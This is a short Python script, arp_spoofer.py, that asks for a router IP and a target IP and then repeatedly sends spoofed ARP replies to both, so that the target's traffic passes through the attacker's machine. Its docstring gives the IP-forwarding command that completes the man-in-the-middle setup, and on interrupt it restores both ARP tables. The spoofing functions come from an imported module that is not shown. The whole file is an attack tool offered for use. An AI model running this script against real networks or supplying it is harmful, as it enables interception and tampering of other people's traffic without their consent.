#!/usr/bin/env python3
""" 
arp_spoofer.py - Spoof ARP replies to a target.

To enable ARP spoofing, you need to have the following:

    echo 1 > /proc/sys/net/ipv4/ip_forward # Enable IP forwarding

"""

from time import sleep
import arp_spoofing as arp_spoofing

router_ip = input("Enter the IP address of the router: ")
target_ip = input("Enter the IP address of the target: ")

try:

    while True:
        arp_spoofing.spoof_arp(target_ip, router_ip)
        arp_spoofing.spoof_arp(router_ip, target_ip)
        sleep(10)

except KeyboardInterrupt:
    print('\n[!] Exiting...')
    arp_spoofing.restore_ip(router_ip, target_ip)
    arp_spoofing.restore_ip(target_ip, router_ip)
    exit()
